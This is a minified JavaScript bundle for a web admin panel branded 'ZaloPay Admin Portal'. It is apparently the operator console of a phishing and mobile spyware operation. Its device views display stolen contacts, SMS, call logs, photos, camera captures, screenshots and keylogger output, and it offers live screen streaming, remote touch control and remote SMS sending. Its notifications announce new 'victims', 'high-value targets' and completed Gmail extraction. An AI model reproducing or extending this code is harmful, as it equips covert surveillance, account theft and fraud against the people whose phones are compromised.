s=qe(),[a,r]=d.useState(""),[i,c]=d.useState({}),[x,l]=d.useState(null),{data:y=[],isLoading:f}=me({queryKey:["actions",t],queryFn:()=>we.getAvailableActions(t)}),b=y.filter(m=>m.platform?m.platform===t||m.platform==="both":!0),o=pe({mutationFn:({action:m,params:B})=>we.executeAction(n,m,B),onSuccess:m=>{l(m),je({title:"Action executed",description:`Action "${a}" executed successfully`}),s.invalidateQueries({queryKey:["device",n]})},onError:m=>{je({title:"Action failed",description:m.message,variant:"destructive"}),l({error:m.message})}}),p=()=>{a&&(l(null),o.mutate({action:a,params:Object.keys(i).length>0?i:void 0}))},g=(m,B)=>{c(P=>({...P,[m]:B}))},h=b.find(m=>m.name===a);return e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"Execute Actions"}),e.jsx(ve,{children:"Execute actions on this device. Actions are platform-aware."})]}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Select Action"}),e.jsxs(ce,{value:a,onValueChange:m=>{r(m),c({}),l(null)},children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Choose an action..."})}),e.jsx(ie,{children:f?e.jsx(R,{value:"loading",disabled:!0,children:"Loading actions..."}):b.length===0?e.jsx(R,{value:"none",disabled:!0,children:"No actions available"}):b.map(m=>e.jsxs(R,{value:m.name,children:[m.name,m.description&&` - ${m.description}`]},m.name))})]})]}),a&&h&&e.jsxs("div",{className:"space-y-2",children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700",children:"Parameters"}),a==="toast"&&e.jsx(se,{placeholder:"Message",value:i.message||"",onChange:m=>g("message",m.target.value)}),a==="send_sms"&&e.jsxs("div",{className:"space-y-2",children:[e.jsx(se,{placeholder:"Phone number",value:i.phone||"",onChange:m=>g("phone",m.target.value)}),e.jsx(se,{placeholder:"Message",value:i.message||"",onChange:m=>g("message",m.target.value)})]}),a==="open_url"&&e.jsx(se,{placeholder:"URL",value:i.url||"",onChange:m=>g("url",m.target.value)}),a==="capture_camera"&&e.jsxs(ce,{value:i.camera||"main",onValueChange:m=>g("camera",m),children:[e.jsx(re,{children:e.jsx(le,{})}),e.jsxs(ie,{children:[e.jsx(R,{value:"main",children:"Main Camera"}),e.jsx(R,{value:"selfie",children:"Selfie Camera"})]})]})]}),e.jsx(C,{onClick:p,disabled:!a||o.isPending,className:"w-full",children:o.isPending?"Executing...":"Execute Action"}),x&&e.jsxs("div",{className:"mt-4 p-4 bg-gray-50 rounded-lg",children:[e.jsx("h4",{className:"font-medium mb-2",children:"Result:"}),e.jsx("pre",{className:"text-xs overflow-auto",children:JSON.stringify(x,null,2)})]}),e.jsxs("div",{className:"mt-6 pt-6 border-t border-gray-200",children:[e.jsxs("h4",{className:"font-medium mb-2",children:["Available Actions (",b.length,")"]}),e.jsx("div",{className:"grid grid-cols-2 gap-2 text-sm",children:b.map(m=>e.jsxs("div",{className:"p-2 bg-gray-50 rounded cursor-pointer hover:bg-gray-100",onClick:()=>r(m.name),children:[e.jsx("div",{className:"font-medium",children:m.name}),m.description&&e.jsx("div",{className:"text-xs text-gray-600",children:m.description})]},m.name))})]})]})]})}function Li({deviceId:n}){qe();const t=d.useRef(null),[s,a]=d.useState({fps:15,resolution:"half",compression:75}),{data:r,refetch:i}=me({queryKey:["screen-status",n],queryFn:()=>we.getScreenStatus(n),refetchInterval:2e3}),c=r,x=pe({mutationFn:g=>we.startScreenStream(n,g),onSuccess:()=>{je({title:"Screen streaming started",description:"Screen streaming has been initiated"}),i()},onError:g=>{je({title:"Failed to start streaming",description:g.message,variant:"destructive"})}}),l=pe({mutationFn:()=>we.stopScreenStream(n),onSuccess:()=>{je({title:"Screen streaming stopped",description:"Screen streaming has been stopped"}),i()},onError:g=>{je({title:"Failed to stop streaming",description:g.message,variant:"destructive"})}}),y=pe({mutationFn:g=>we.updateScreenQuality(n,g),onSuccess:()=>{je({title:"Quality updated",description:"Screen quality settings have been updated"}),i()},onError:g=>{je({title:"Failed to update quality",description:g.message,variant:"destructive"})}});Et({onScreenFrame:g=>{if(g.device_id===n&&t.current){const h=t.current,m=h.getContext("2d");if(m&&g.frame){const B=new Image;B.onload=()=>{h.width=B.width,h.height=B.height,m.drawImage(B,0,0)},B.src=`data:image/jpeg;base64,${g.frame}`}}}});const f=()=>{x.mutate(s)},b=()=>{l.mutate()},o=()=>{y.mutate(s)},p=(c==null?void 0:c.streaming)||!1;return e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(bt,{className:"h-5 w-5"}),"Screen Control"]}),e.jsx(ve,{children:"Stream and view device screen in real-time"})]}),e.jsxs(_,{className:"space-y-4",children:[e.jsx("div",{className:"border border-gray-200 rounded-lg bg-black aspect-video flex items-center justify-center",children:p?e.jsx("canvas",{ref:t,className:"max-w-full max-h-full",style:{imageRendering:"pixelated"}}):e.jsxs("div",{className:"text-gray-500 text-center",children:[e.jsx(bt,{className:"h-12 w-12 mx-auto mb-2 opacity-50"}),e.jsx("p",{children:"Screen streaming not active"}),e.jsx("p",{className:"text-sm",children:"Click Start to begin streaming"})]})}),e.jsxs("div",{className:"flex items-center justify-between p-3 bg-gray-50 rounded-lg",children:[e.jsxs("div",{children:[e.jsx("span",{className:"text-sm font-medium",children:"Status:"}),e.jsx("span",{className:`ml-2 text-sm ${p?"text-green-600":"text-gray-600"}`,children:p?"Streaming":"Stopped"})]}),(c==null?void 0:c.started_at)&&e.jsxs("div",{className:"text-xs text-gray-500",children:["Started: ",new Date(c.started_at).toLocaleTimeString()]})]}),e.jsx("div",{className:"flex gap-2",children:p?e.jsxs(C,{onClick:b,disabled:l.isPending,variant:"destructive",className:"flex-1",children:[e.jsx(on,{className:"h-4 w-4 mr-2"}),l.isPending?"Stopping...":"Stop Streaming"]}):e.jsxs(C,{onClick:f,disabled:x.isPending,className:"flex-1",children:[e.jsx(lt,{className:"h-4 w-4 mr-2"}),x.isPending?"Starting...":"Start Streaming"]})}),e.jsxs("div",{className:"border-t pt-4 space-y-3",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[e.jsx(as,{className:"h-4 w-4"}),e.jsx("span",{className:"font-medium text-sm",children:"Quality Settings"})]}),e.jsxs("div",{className:"grid grid-cols-3 gap-2",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs text-gray-600 mb-1",children:"FPS"}),e.jsx(se,{type:"number",min:"5",max:"30",value:s.fps||15,onChange:g=>a({...s,fps:parseInt(g.target.value)||15}),className:"text-sm"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs text-gray-600 mb-1",children:"Resolution"}),e.jsxs(ce,{value:s.resolution||"half",onValueChange:g=>a({...s,resolution:g}),children:[e.jsx(re,{className:"text-sm",children:e.jsx(le,{})}),e.jsxs(ie,{children:[e.jsx(R,{value:"full",children:"Full"}),e.jsx(R,{value:"half",children:"Half"}),e.jsx(R,{value:"quarter",children:"Quarter"})]})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs text-gray-600 mb-1",children:"Compression"}),e.jsx(se,{type:"number",min:"60",max:"90",value:s.compression||75,onChange:g=>a({...s,compression:parseInt(g.target.value)||75}),className:"text-sm"})]})]}),p&&e.jsx(C,{onClick:o,disabled:y.isPending,variant:"outline",size:"sm",className:"w-full",children:y.isPending?"Updating...":"Update Quality"})]})]})]})}function Mi({deviceId:n}){qe();const t=d.useRef(null),[s,a]=d.useState(!1),[r,i]=d.useState(""),{data:c,refetch:x}=me({queryKey:["control-status",n],queryFn:()=>we.getControlStatus(n),refetchInterval:2e3}),l=c,y=pe({mutationFn:()=>we.startRemoteControl(n),onSuccess:()=>{je({title:"Remote control started",description:"Remote control session has been initiated"}),x()},onError:S=>{je({title:"Failed to start remote control",description:S.message,variant:"destructive"})}}),f=pe({mutationFn:()=>we.stopRemoteControl(n),onSuccess:()=>{je({title:"Remote control stopped",description:"Remote control session has been stopped"}),x()},onError:S=>{je({title:"Failed to stop remote control",description:S.message,variant:"destructive"})}}),b=pe({mutationFn:S=>we.sendControlCommand(n,S),onError:S=>{je({title:"Command failed",description:S.message,variant:"destructive"})}});Et({onControlResponse:S=>{S.device_id===n&&(S.success||je({title:"Command failed",description:"Device rejected the command",variant:"destructive"}))}});const o=()=>{y.mutate()},p=()=>{f.mutate()},g=(S,O)=>{l!=null&&l.active&&b.mutate({type:"touch",data:{x:S,y:O}})},h=(S,O,V,v)=>{l!=null&&l.active&&b.mutate({type:"swipe",data:{x1:S,y1:O,x2:V,y2:v}})},m=S=>{l!=null&&l.active&&b.mutate({type:"key",data:{key:S}})},B=(S,O=100)=>{l!=null&&l.active&&b.mutate({type:"scroll",data:{direction:S,distance:O}})};d.useEffect(()=>{const S=t.current;if(!S)return;S.width=800,S.height=600;const O=S.getContext("2d");O&&(O.fillStyle="#ffffff",O.fillRect(0,0,S.width,S.height))},[]),d.useEffect(()=>{const S=t.current;if(!S||!(l!=null&&l.active))return;const O=D=>{const z=S.getBoundingClientRect(),G="touches"in D?D.touches[0].clientX:D.clientX,j="touches"in D?D.touches[0].clientY:D.clientY;return{x:(G-z.left)/z.width*S.width,y:(j-z.top)/z.height*S.height}};let V=null;const v=D=>{D.preventDefault(),V=O(D),a(!0)},I=D=>{!s||!V||D.preventDefault()},u=D=>{if(!V)return;D.preventDefault();const z=O(D);Math.sqrt(Math.pow(z.x-V.x,2)+Math.pow(z.y-V.y,2))<10?g(V.x,V.y):h(V.x,V.y,z.x,z.y),V=null,a(!1)};return S.addEventListener("mousedown",v),S.addEventListener("mousemove",I),S.addEventListener("mouseup",u),S.addEventListener("touchstart",v),S.addEventListener("touchmove",I),S.addEventListener("touchend",u),()=>{S.removeEventListener("mousedown",v),S.removeEventListener("mousemove",I),S.removeEventListener("mouseup",u),S.removeEventListener("touchstart",v),S.removeEventListener("touchmove",I),S.removeEventListener("touchend",u)}},[l==null?void 0:l.active,s]);const P=(l==null?void 0:l.active)||!1;return e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(ws,{className:"h-5 w-5"}),"Remote Control"]}),e.jsx(ve,{children:"Control device remotely with touch, swipe, key, and scroll commands"})]}),e.jsxs(_,{className:"space-y-4",children:[e.jsx("div",{className:"border border-gray-200 rounded-lg bg-gray-100 aspect-video flex items-center justify-center",children:P?e.jsx("canvas",{ref:t,className:"max-w-full max-h-full bg-white cursor-crosshair",style:{touchAction:"none"}}):e.jsxs("div",{className:"text-gray-500 text-center",children:[e.jsx(ws,{className:"h-12 w-12 mx-auto mb-2 opacity-50"}),e.jsx("p",{children:"Remote control not active"}),e.jsx("p",{className:"text-sm",children:"Click Start to begin remote control"})]})}),e.jsxs("div",{className:"flex items-center justify-between p-3 bg-gray-50 rounded-lg",children:[e.jsxs("div",{children:[e.jsx("span",{className:"text-sm font-medium",children:"Status:"}),e.jsx("span",{className:`ml-2 text-sm ${P?"text-green-600":"text-gray-600"}`,children:P?"Active":"Inactive"})]}),(l==null?void 0:l.command_count)!==void 0&&e.jsxs("div",{className:"text-xs text-gray-500",children:["Commands: ",l.command_count]})]}),e.jsx("div",{className:"flex gap-2",children:P?e.jsxs(C,{onClick:p,disabled:f.isPending,variant:"destructive",className:"flex-1",children:[e.jsx(on,{className:"h-4 w-4 mr-2"}),f.isPending?"Stopping...":"Stop Remote Control"]}):e.jsxs(C,{onClick:o,disabled:y.isPending,className:"flex-1",children:[e.jsx(lt,{className:"h-4 w-4 mr-2"}),y.isPending?"Starting...":"Start Remote Control"]})}),P&&e.jsxs("div",{className:"border-t pt-4 space-y-2",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[e.jsx(ln,{className:"h-4 w-4"}),e.jsx("span",{className:"font-medium text-sm",children:"Send Key"})]}),e.jsxs("div",{className:"flex gap-2",children:[e.jsx(se,{placeholder:"Enter key (e.g., Enter, Back, Home)",value:r,onChange:S=>i(S.target.value),onKeyPress:S=>{S.key==="Enter"&&(m(r||S.key),i(""))}}),e.jsx(C,{onClick:()=>{r&&(m(r),i(""))},size:"sm",children:"Send"})]})]}),P&&e.jsxs("div",{className:"border-t pt-4 space-y-2",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[e.jsx(ys,{className:"h-4 w-4"}),e.jsx("span",{className:"font-medium text-sm",children:"Scroll"})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-2",children:[e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>B("up"),children:[e.jsx(ys,{className:"h-4 w-4 mr-1"}),"Up"]}),e.jsxs(C,{variant:"outline",size:"sm",onClick:()=>B("down"),children:[e.jsx(ia,{className:"h-4 w-4 mr-1"}),"Down"]}),e.jsx(C,{variant:"outline",size:"sm",onClick:()=>B("left"),children:"← Left"}),e.jsx(C,{variant:"outline",size:"sm",onClick:()=>B("right"),children:"Right →"})]})]}),P&&e.jsx("div",{className:"border-t pt-4",children:e.jsxs("p",{className:"text-xs text-gray-600",children:[e.jsx("strong",{children:"Instructions:"})," Click/tap on the canvas to send touch commands. Drag to swipe. Use the key input to send keyboard commands."]})})]})]})}function Pi(){var o;const[,n]=Zn("/devices/:id"),[,t]=Xe(),[s,a]=d.useState("overview"),r=n==null?void 0:n.id,{data:i,isLoading:c,error:x,refetch:l}=me({queryKey:["device",r],queryFn:()=>we.getDeviceById(r),enabled:!!r});Et({onDeviceDataUpdate:p=>{p.device_id===r&&l()}});const y=p=>new Date(p).toLocaleString("vi-VN",{year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"}),f=p=>i!=null&&i.device_data?i.device_data.filter(g=>g.data_type===p):[],b=[{id:"overview",label:"Overview",icon:ns},{id:"contacts",label:"Contacts",icon:Ct},{id:"sms",label:"SMS",icon:fa},{id:"calls",label:"Calls",icon:St},{id:"gallery",label:"Gallery",icon:vs},{id:"camera",label:"Camera",icon:la},{id:"screenshots",label:"Screenshots",icon:vs},{id:"keylogger",label:"Keylogger",icon:ln},{id:"actions",label:"Actions",icon:Ue}];return c?e.jsx("div",{className:"p-6",children:e.jsx("div",{className:"flex items-center justify-center py-12",children:e.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"})})}):x||!i?e.jsx("div",{className:"p-6",children:e.jsxs("div",{className:"bg-red-50 border border-red-200 rounded-lg p-4",children:[e.jsx("p",{className:"text-red-800",children:x instanceof Error?x.message:"Device not found"}),e.jsx(C,{onClick:()=>t("/devices"),className:"mt-2",children:"Back to Devices"})]})}):e.jsxs("div",{className:"p-6",children:[e.jsxs("div",{className:"mb-6",children:[e.jsxs(C,{variant:"ghost",onClick:()=>t("/devices"),className:"mb-4",children:[e.jsx(ts,{className:"h-4 w-4 mr-2"}),"Back to Devices"]}),e.jsxs("div",{className:"flex items-start justify-between",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900 mb-2",children:i.model||i.device_id||"Unknown Device"}),e.jsx("p",{className:"text-sm text-gray-600 font-mono",children:i.device_id})]}),e.jsx(Zt,{status:i.status,platform:i.platform})]})]}),e.jsx("div",{className:"border-b border-gray-200 mb-6",children:e.jsx("nav",{className:"flex space-x-8 overflow-x-auto",children:b.map(p=>{const g=p.icon;return e.jsxs("button",{onClick:()=>a(p.id),className:`
                  flex items-center gap-2 py-4 px-1 border-b-2 font-medium text-sm
                  ${s===p.id?"border-blue-500 text-blue-600":"border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"}
                `,children:[e.jsx(g,{className:"h-4 w-4"}),p.label]},p.id)})})}),e.jsxs("div",{children:[s==="overview"&&e.jsxs("div",{className:"space-y-4",children:[e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"Device Information"}),e.jsx(ve,{children:"Basic device details and status"})]}),e.jsx(_,{children:e.jsxs("dl",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("dt",{className:"text-sm font-medium text-gray-600",children:"Platform"}),e.jsxs("dd",{className:"mt-1 text-sm text-gray-900",children:[((o=i.platform)==null?void 0:o.toUpperCase())||"N/A",i.platform_version&&` ${i.platform_version}`]})]}),e.jsxs("div",{children:[e.jsx("dt",{className:"text-sm font-medium text-gray-600",children:"Model"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900",children:i.model||"N/A"})]}),e.jsxs("div",{children:[e.jsx("dt",{className:"text-sm font-medium text-gray-600",children:"Version"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900",children:i.version||"N/A"})]}),e.jsxs("div",{children:[e.jsx("dt",{className:"text-sm font-medium text-gray-600",children:"IP Address"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 font-mono",children:i.ip_address||"N/A"})]}),e.jsxs("div",{children:[e.jsx("dt",{className:"text-sm font-medium text-gray-600",children:"Status"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 capitalize",children:i.status})]}),e.jsxs("div",{children:[e.jsx("dt",{className:"text-sm font-medium text-gray-600",children:"Connected At"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900",children:y(i.connected_at)})]}),e.jsxs("div",{children:[e.jsx("dt",{className:"text-sm font-medium text-gray-600",children:"Last Seen"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900",children:y(i.last_seen)})]}),e.jsxs("div",{children:[e.jsx("dt",{className:"text-sm font-medium text-gray-600",children:"Device ID"}),e.jsx("dd",{className:"mt-1 text-sm text-gray-900 font-mono break-all",children:i.device_id})]})]})})]}),i.metadata&&Object.keys(i.metadata).length>0&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Metadata"})}),e.jsx(_,{children:e.jsx("pre",{className:"text-xs bg-gray-50 p-4 rounded overflow-auto",children:JSON.stringify(i.metadata,null,2)})})]}),e.jsx(Li,{deviceId:i.id}),e.jsx(Mi,{deviceId:i.id})]}),s==="contacts"&&e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"Contacts"}),e.jsx(ve,{children:"Device contacts data"})]}),e.jsx(_,{children:f("contacts").length>0?e.jsx("div",{className:"space-y-2",children:f("contacts").map((p,g)=>e.jsxs("div",{className:"p-3 bg-gray-50 rounded",children:[e.jsx("pre",{className:"text-xs overflow-auto",children:JSON.stringify(p.data,null,2)}),e.jsxs("p",{className:"text-xs text-gray-500 mt-1",children:["Captured: ",y(p.captured_at)]})]},g))}):e.jsx("p",{className:"text-gray-500 text-center py-8",children:"No contacts data available"})})]}),s==="sms"&&e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"SMS Messages"}),e.jsx(ve,{children:"Device SMS data"})]}),e.jsx(_,{children:f("sms").length>0?e.jsx("div",{className:"space-y-2",children:f("sms").map((p,g)=>e.jsxs("div",{className:"p-3 bg-gray-50 rounded",children:[e.jsx("pre",{className:"text-xs overflow-auto",children:JSON.stringify(p.data,null,2)}),e.jsxs("p",{className:"text-xs text-gray-500 mt-1",children:["Captured: ",y(p.captured_at)]})]},g))}):e.jsx("p",{className:"text-gray-500 text-center py-8",children:"No SMS data available"})})]}),s==="calls"&&e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"Call History"}),e.jsx(ve,{children:"Device call history data"})]}),e.jsx(_,{children:f("calls").length>0?e.jsx("div",{className:"space-y-2",children:f("calls").map((p,g)=>e.jsxs("div",{className:"p-3 bg-gray-50 rounded",children:[e.jsx("pre",{className:"text-xs overflow-auto",children:JSON.stringify(p.data,null,2)}),e.jsxs("p",{className:"text-xs text-gray-500 mt-1",children:["Captured: ",y(p.captured_at)]})]},g))}):e.jsx("p",{className:"text-gray-500 text-center py-8",children:"No call history available"})})]}),s==="gallery"&&e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"Gallery"}),e.jsx(ve,{children:"Device gallery images"})]}),e.jsx(_,{children:f("gallery").length>0?e.jsx("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:f("gallery").map((p,g)=>e.jsx("div",{className:"relative",children:p.data.url&&e.jsx("img",{src:p.data.url,alt:`Gallery ${g+1}`,className:"w-full h-32 object-cover rounded"})},g))}):e.jsx("p",{className:"text-gray-500 text-center py-8",children:"No gallery images available"})})]}),s==="camera"&&e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"Camera Captures"}),e.jsx(ve,{children:"Camera capture data"})]}),e.jsx(_,{children:f("camera").length>0?e.jsx("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:f("camera").map((p,g)=>e.jsxs("div",{className:"relative",children:[p.data.url&&e.jsx("img",{src:p.data.url,alt:`Camera ${g+1}`,className:"w-full h-32 object-cover rounded"}),e.jsx("p",{className:"text-xs text-gray-500 mt-1",children:y(p.captured_at)})]},g))}):e.jsx("p",{className:"text-gray-500 text-center py-8",children:"No camera captures available"})})]}),s==="screenshots"&&e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"Screenshots"}),e.jsx(ve,{children:"Device screenshots"})]}),e.jsx(_,{children:f("screenshots").length>0?e.jsx("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:f("screenshots").map((p,g)=>e.jsxs("div",{className:"relative",children:[p.data.url&&e.jsx("img",{src:p.data.url,alt:`Screenshot ${g+1}`,className:"w-full h-32 object-cover rounded"}),e.jsx("p",{className:"text-xs text-gray-500 mt-1",children:y(p.captured_at)})]},g))}):e.jsx("p",{className:"text-gray-500 text-center py-8",children:"No screenshots available"})})]}),s==="keylogger"&&e.jsxs(k,{children:[e.jsxs(L,{children:[e.jsx(M,{children:"Keylogger Data"}),e.jsx(ve,{children:"Captured keystrokes"})]}),e.jsx(_,{children:f("keylogger").length>0?e.jsx("div",{className:"space-y-2",children:f("keylogger").map((p,g)=>e.jsxs("div",{className:"p-3 bg-gray-50 rounded",children:[e.jsx("pre",{className:"text-xs overflow-auto",children:JSON.stringify(p.data,null,2)}),e.jsxs("p",{className:"text-xs text-gray-500 mt-1",children:["Captured: ",y(p.captured_at)]})]},g))}):e.jsx("p",{className:"text-gray-500 text-center py-8",children:"No keylogger data available"})})]}),s==="actions"&&e.jsx(Oi,{deviceId:i.id,platform:i.platform})]})]})}const Rt=d.createContext(void 0);function qn({children:n}){const[t,s]=d.useState(!1);return e.jsx(Rt.Provider,{value:{open:t,setOpen:s},children:e.jsx("div",{className:"relative inline-block text-left",children:n})})}function In({children:n,asChild:t}){const s=d.useContext(Rt);if(!s)throw new Error("DropdownMenuTrigger must be used within DropdownMenu");const{open:a,setOpen:r}=s,i=()=>{r(!a)};return t&&ps.isValidElement(n)?ps.cloneElement(n,{...n.props,onClick:i}):e.jsx("button",{onClick:i,children:n})}function Bn({children:n,align:t="center",className:s}){const a=d.useContext(Rt),r=d.useRef(null);if(!a)throw new Error("DropdownMenuContent must be used within DropdownMenu");const{open:i,setOpen:c}=a;if(d.useEffect(()=>{const l=y=>{r.current&&!r.current.contains(y.target)&&c(!1)};return i&&document.addEventListener("mousedown",l),()=>{document.removeEventListener("mousedown",l)}},[i,c]),!i)return null;const x={start:"left-0",center:"left-1/2 transform -translate-x-1/2",end:"right-0"};return e.jsx("div",{ref:r,className:Z("absolute z-50 mt-2 min-w-[8rem] overflow-hidden rounded-md border border-gray-200 bg-white p-1 text-gray-950 shadow-md",x[t],s),children:n})}function qs({children:n,onClick:t,className:s}){const a=d.useContext(Rt);if(!a)throw new Error("DropdownMenuItem must be used within DropdownMenu");const{setOpen:r}=a,i=()=>{t&&t(),r(!1)};return e.jsx("div",{className:Z("relative flex cursor-default select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none transition-colors hover:bg-gray-100 focus:bg-gray-100 data-[disabled]:pointer-events-none data-[disabled]:opacity-50",s),onClick:i,children:n})}function Is(){return e.jsx("div",{className:"my-1 h-px bg-gray-200"})}function Di(){const[n,t]=d.useState([]),[s,a]=d.useState(0),{toast:r}=Se();Ge({type:"all",enabled:!0,onMessage:f=>{var h,m,B,P;const{type:b,data:o,timestamp:p}=f;let g=null;switch(b){case"victim:captured":case"victim:registered":g={id:`notification-${Date.now()}-${Math.random()}`,type:"success",title:"New Victim",message:o.email||"New victim captured",timestamp:p||new Date().toISOString(),read:!1,data:o};break;case"alert:high-value-target":g={id:`notification-${Date.now()}-${Math.random()}`,type:"warning",title:"High-Value Target",message:`New high-value target: ${o.email||"Unknown"}`,timestamp:p||new Date().toISOString(),read:!1,data:o};break;case"gmail:extraction-completed":g={id:`notification-${Date.now()}-${Math.random()}`,type:"success",title:"Gmail Extraction Complete",message:`Extracted ${((h=o.itemsExtracted)==null?void 0:h.emails)||0} emails`,timestamp:p||new Date().toISOString(),read:!1,data:o};break;case"campaign:created":case"campaign:updated":g={id:`notification-${Date.now()}-${Math.random()}`,type:"info",title:"Campaign Updated",message:((m=o.campaign)==null?void 0:m.name)||"Campaign status changed",timestamp:p||new Date().toISOString(),read:!1,data:o};break;case"device:connected":g={id:`notification-${Date.now()}-${Math.random()}`,type:"success",title:"Device Connected",message:`Device ${((B=o.device)==null?void 0:B.model)||o.id} connected`,timestamp:p||new Date().toISOString(),read:!1,data:o};break;case"device:disconnected":g={id:`notification-${Date.now()}-${Math.random()}`,type:"warning",title:"Device Disconnected",message:`Device ${((P=o.device)==null?void 0:P.model)||o.id} disconnected`,timestamp:p||new Date().toISOString(),read:!1,data:o};break;case"activity:log-created":g={id:`notification-${Date.now()}-${Math.random()}`,type:"info",title:"New Activity",message:o.actionType||"New activity logged",timestamp:p||new Date().toISOString(),read:!1,data:o};break}g&&(t(S=>[g,...S].slice(0,50)),a(S=>S+1),(g.type==="warning"||g.type==="error")&&r({title:g.title,description:g.message,variant:g.type==="error"?"destructive":"default"}))}}),d.useEffect(()=>{const f=n.filter(b=>!b.read).length;a(f)},[n]);const i=f=>{t(b=>b.map(o=>o.id===f?{...o,read:!0}:o))},c=()=>{t(f=>f.map(b=>({...b,read:!0})))},x=()=>{t([]),a(0)},l=f=>{switch(f){case"success":return e.jsx(ge,{className:"h-4 w-4 text-green-600"});case"warning":return e.jsx(Le,{className:"h-4 w-4 text-yellow-600"});case"error":return e.jsx(Ne,{className:"h-4 w-4 text-red-600"});default:return e.jsx(ns,{className:"h-4 w-4 text-blue-600"})}},y=f=>{switch(f){case"success":return"bg-green-50 border-green-200";case"warning":return"bg-yellow-50 border-yellow-200";case"error":return"bg-red-50 border-red-200";default:return"bg-blue-50 border-blue-200"}};return e.jsxs(qn,{children:[e.jsx(In,{asChild:!0,children:e.jsxs(C,{variant:"ghost",size:"icon",className:"relative",children:[e.jsx(Ft,{className:"h-5 w-5"}),s>0&&e.jsx($,{className:"absolute -top-1 -right-1 h-5 w-5 rounded-full p-0 text-xs flex items-center justify-center",children:s>9?"9+":s})]})}),e.jsx(Bn,{align:"end",className:"w-96 p-0",children:e.jsxs(k,{className:"border-0 shadow-none",children:[e.jsx(L,{className:"pb-3",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx(M,{className:"text-lg",children:"Notifications"}),e.jsxs("div",{className:"flex gap-2",children:[s>0&&e.jsx(C,{variant:"ghost",size:"sm",onClick:c,className:"h-7 text-xs",children:"Mark all read"}),n.length>0&&e.jsx(C,{variant:"ghost",size:"sm",onClick:x,className:"h-7 text-xs",children:"Clear"})]})]})}),e.jsx(_,{className:"p-0",children:n.length===0?e.jsxs("div",{className:"p-8 text-center",children:[e.jsx(Ft,{className:"h-12 w-12 text-gray-300 mx-auto mb-4"}),e.jsx("p",{className:"text-sm text-gray-500",children:"No notifications"})]}):e.jsx("div",{className:"max-h-[400px] overflow-y-auto",children:n.map(f=>e.jsx("div",{className:`p-4 border-b border-gray-100 hover:bg-gray-50 transition-colors ${f.read?"":y(f.type)}`,onClick:()=>i(f.id),children:e.jsxs("div",{className:"flex items-start gap-3",children:[e.jsx("div",{className:"mt-0.5",children:l(f.type)}),e.jsx("div",{className:"flex-1 min-w-0",children:e.jsxs("div",{className:"flex items-start justify-between gap-2",children:[e.jsxs("div",{className:"flex-1",children:[e.jsx("p",{className:"text-sm font-medium text-gray-900",children:f.title}),e.jsx("p",{className:"text-sm text-gray-600 mt-1",children:f.message}),e.jsx("p",{className:"text-xs text-gray-400 mt-1",children:ht(f.timestamp)})]}),!f.read&&e.jsx("div",{className:"w-2 h-2 bg-blue-500 rounded-full flex-shrink-0 mt-1"})]})})]})},f.id))})})]})})]})}function qi({onMenuClick:n}){const[t,s]=d.useState(Q.getUser()),a=async()=>{await Q.logout(),window.location.href="/admin#/login"},r=()=>{window.location.href="/admin#/settings"};return e.jsxs("header",{className:"h-16 bg-white border-b border-gray-200 px-4 flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center gap-4",children:[e.jsx(C,{variant:"ghost",size:"icon",onClick:n,className:"lg:hidden",children:e.jsx(ga,{className:"h-5 w-5"})}),e.jsx("div",{className:"hidden lg:block",children:e.jsx("h1",{className:"text-lg font-semibold text-gray-900",children:"ZaloPay Admin Portal"})})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx(Di,{}),e.jsxs(qn,{children:[e.jsx(In,{asChild:!0,children:e.jsxs(C,{variant:"ghost",className:"flex items-center gap-2 px-3",children:[e.jsx("div",{className:"w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center",children:e.jsx(_e,{className:"h-4 w-4 text-white"})}),e.jsxs("div",{className:"hidden md:block text-left",children:[e.jsx("p",{className:"text-sm font-medium",children:(t==null?void 0:t.username)||"Admin"}),e.jsx("p",{className:"text-xs text-gray-500",children:t==null?void 0:t.email})]}),e.jsx(ss,{className:"h-4 w-4 